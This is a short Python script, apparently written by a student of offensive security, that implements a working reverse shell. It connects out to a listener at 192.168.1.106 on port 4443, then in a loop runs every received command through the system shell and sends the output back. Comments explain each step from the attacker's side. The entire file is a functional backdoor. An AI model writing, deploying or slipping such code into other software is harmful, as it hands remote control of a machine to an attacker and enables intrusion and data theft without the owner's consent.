#!/usr/bin/env python
import socket, subprocess

def execute_command(command):
  return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 1st argument - address family, 2nd - socket type
connection.connect(("192.168.1.106",4443))
# This method connects this pipe to a destination. The first argument
# it takes is the IP we have to connect to, the second one is the port.
# The connect method takes a tuple

# message = '\n Connection established.'
# connection.send(message.encode('utf-8'))

while True:
  command = connection.recv(1024)
  # From what I understand, this is similar to 'command = input("Command:")'
  # Whatever you write is stored in the variable 'command' and then
  # received by the target terminal.
  # You will be able to receive a maximum of 1024 bytes per each batch of
  # data. With connection.recv(), you can send packets of # data like text or commands from your attack machine
  command_result = execute_command(command)
  # To execute a string as a system command I have to use the library
  # subprocess. The function execute_command returns the output
  connection.send(command_result)
  # This will show us / send us the output (check_output()) of our command
connection.close()
# We close the connection